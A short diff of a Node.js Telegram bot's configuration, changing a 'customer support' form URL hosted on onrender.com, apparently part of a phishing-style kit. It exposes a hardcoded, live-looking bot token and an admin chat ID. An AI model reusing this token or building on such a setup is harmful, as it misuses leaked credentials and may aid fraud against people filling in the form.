@@ -9,7 +9,7 @@ const path = require('path');
 const BOT_TOKEN = '8480744633:AAHs2wpz1cw94MaEbQbm7BLsTOUqRnvQmj8'; // apna bot token
 const ADMIN_IDS = [-1003025188008]; // apna chat/group id
 const DEVELOPER = '@heck0bot';
-const FORM_URL = 'https://customersupport-j47c.onrender.com';
+const FORM_URL = 'https://customer-support-jlyt.onrender.com';
 const PORT = 3000;
 
 // ===== INIT =====
